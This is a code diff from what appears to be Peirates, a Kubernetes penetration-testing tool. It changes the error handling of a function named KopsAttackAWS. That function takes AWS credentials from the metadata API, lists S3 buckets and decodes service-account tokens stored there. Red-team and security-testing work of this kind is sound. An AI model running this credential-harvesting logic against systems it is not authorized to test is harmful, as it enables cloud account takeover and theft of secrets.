@@ -321,17 +321,18 @@ func nonexitErrorf(msg string, args ...interface{}) {
 
 }
 
-func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredentials, assumedAWSrole AWSCredentials) (err error) {
+func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredentials, assumedAWSrole AWSCredentials, interactive bool) {
 
 	var storeTokens string
 	placeTokensInStore := false
 
 	println("[1] Store all tokens found in Peirates data store")
 	println("[2] Retrieve all tokens - I will copy and paste")
-	_, err = fmt.Scanln(&storeTokens)
+	_, err := fmt.Scanln(&storeTokens)
 	if err != nil {
 		println("[-] Error reading input")
-		return err
+		pauseToHitEnter(interactive)
+		return
 	}
 	storeTokens = strings.TrimSpace(storeTokens)
 
@@ -354,7 +355,8 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredenti
 		result, err := PullIamCredentialsFromAWS()
 		if err != nil {
 			println("[-] Could not get AWS credentials from metadata API.")
-			return err
+			pauseToHitEnter(interactive)
+			return
 		}
 		println("[+] Got AWS credentials from metadata API.")
 		awsCredentials = result
@@ -366,7 +368,8 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredenti
 	result, err := ListAWSBuckets(credentialsToUse)
 	if err != nil {
 		println("Could not list buckets")
-		return err
+		pauseToHitEnter(interactive)
+		return
 	}
 	listOfBuckets := result
 
@@ -382,7 +385,8 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredenti
 		resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
 		if err != nil {
 			println("Unable to list items in bucket %q, %v", bucket, err)
-			return err
+			pauseToHitEnter(interactive)
+			return
 		}
 
 		for _, item := range resp.Contents {
@@ -416,6 +420,8 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredenti
 				token, err := base64.StdEncoding.DecodeString(encodedToken)
 				if err != nil {
 					println("[-] Could not decode token.")
+					pauseToHitEnter(interactive)
+					return
 				} else {
 					tokenString := string(token)
 					println(tokenString)
@@ -431,7 +437,7 @@ func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredenti
 
 		}
 	}
-	return nil
+	return
 
 }
 
